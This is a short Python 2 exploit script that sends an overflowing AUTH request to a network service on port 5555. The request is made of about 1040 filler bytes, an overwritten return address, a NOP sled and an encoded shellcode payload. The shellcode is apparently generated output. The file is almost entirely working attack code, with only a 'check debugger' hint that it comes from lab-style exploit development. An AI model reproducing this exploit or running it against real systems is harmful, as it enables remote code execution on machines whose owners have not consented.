#!/usr/bin/python
import time, struct, sys
import socket as so

try:
    server = sys.argv[1]
    port = 5555
except IndexError:
    print "[+] Usage %s host" % sys.argv[0]
    sys.exit()

buf =  ""
buf += "\xba\x2e\xde\xee\x16\xd9\xc8\xd9\x74\x24\xf4\x58\x31"
buf += "\xc9\xb1\x52\x31\x50\x12\x83\xc0\x04\x03\x7e\xd0\x0c"
buf += "\xe3\x82\x04\x52\x0c\x7a\xd5\x33\x84\x9f\xe4\x73\xf2"
buf += "\xd4\x57\x44\x70\xb8\x5b\x2f\xd4\x28\xef\x5d\xf1\x5f"
buf += "\x58\xeb\x27\x6e\x59\x40\x1b\xf1\xd9\x9b\x48\xd1\xe0"
buf += "\x53\x9d\x10\x24\x89\x6c\x40\xfd\xc5\xc3\x74\x8a\x90"
buf += "\xdf\xff\xc0\x35\x58\x1c\x90\x34\x49\xb3\xaa\x6e\x49"
buf += "\x32\x7e\x1b\xc0\x2c\x63\x26\x9a\xc7\x57\xdc\x1d\x01"
buf += "\xa6\x1d\xb1\x6c\x06\xec\xcb\xa9\xa1\x0f\xbe\xc3\xd1"
buf += "\xb2\xb9\x10\xab\x68\x4f\x82\x0b\xfa\xf7\x6e\xad\x2f"
buf += "\x61\xe5\xa1\x84\xe5\xa1\xa5\x1b\x29\xda\xd2\x90\xcc"
buf += "\x0c\x53\xe2\xea\x88\x3f\xb0\x93\x89\xe5\x17\xab\xc9"
buf += "\x45\xc7\x09\x82\x68\x1c\x20\xc9\xe4\xd1\x09\xf1\xf4"
buf += "\x7d\x19\x82\xc6\x22\xb1\x0c\x6b\xaa\x1f\xcb\x8c\x81"
buf += "\xd8\x43\x73\x2a\x19\x4a\xb0\x7e\x49\xe4\x11\xff\x02"
buf += "\xf4\x9e\x2a\x84\xa4\x30\x85\x65\x14\xf1\x75\x0e\x7e"
buf += "\xfe\xaa\x2e\x81\xd4\xc2\xc5\x78\xbf\xe6\x12\x82\xf5"
buf += "\x9f\x26\x82\x08\xdb\xae\x64\x60\x0b\xe7\x3f\x1d\xb2"
buf += "\xa2\xcb\xbc\x3b\x79\xb6\xff\xb0\x8e\x47\xb1\x30\xfa"
buf += "\x5b\x26\xb1\xb1\x01\xe1\xce\x6f\x2d\x6d\x5c\xf4\xad"
buf += "\xf8\x7d\xa3\xfa\xad\xb0\xba\x6e\x40\xea\x14\x8c\x99"
buf += "\x6a\x5e\x14\x46\x4f\x61\x95\x0b\xeb\x45\x85\xd5\xf4"
buf += "\xc1\xf1\x89\xa2\x9f\xaf\x6f\x1d\x6e\x19\x26\xf2\x38"
buf += "\xcd\xbf\x38\xfb\x8b\xbf\x14\x8d\x73\x71\xc1\xc8\x8c"
buf += "\xbe\x85\xdc\xf5\xa2\x35\x22\x2c\x67\x45\x69\x6c\xce"
buf += "\xce\x34\xe5\x52\x93\xc6\xd0\x91\xaa\x44\xd0\x69\x49"
buf += "\x54\x91\x6c\x15\xd2\x4a\x1d\x06\xb7\x6c\xb2\x27\x92"

req1 = "AUTH " + "\x41"*1040 + "\x71\x1D\xD1\x65" + "\x90" * 16 + buf  + "C" * (1072 - 1040 - 4 - 16 - len(buf))

s = so.socket(so.AF_INET, so.SOCK_STREAM)
try:
     s.connect((server, port))
     print repr(s.recv(1024))
     s.send(req1)
     print repr(s.recv(1024))
except:
     print "[!] connection refused, check debugger"
s.close()
